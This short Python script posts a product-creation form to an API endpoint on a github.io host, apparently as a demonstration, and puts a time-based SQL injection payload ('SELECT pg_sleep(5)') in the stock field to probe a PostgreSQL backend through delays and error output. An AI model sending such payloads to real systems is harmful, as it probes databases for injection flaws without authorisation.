import requests

headers = {
    'authority': 'tonybaloney.github.io',
    'accept': '*/*',
    'dnt': '1',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    '$session': 'COOKIESESsioN\\u002123',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://tonybaloney.github.io',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://tonybaloney.github.io/yt/hwp/1.html',
    'accept-language': 'en-US,en;q=0.9,ja;q=0.8,fr-FR;q=0.7,fr;q=0.6',
}

data = {
  'id': 11234567,
  'name': 'New Product',
  'price': 29,
  'stock': "(SELECT pg_sleep(5))"
}

response = requests.post('https://tonybaloney.github.io/products/create.api', headers=headers, data=data)
if response.status_code == 500:
    print(response.text)

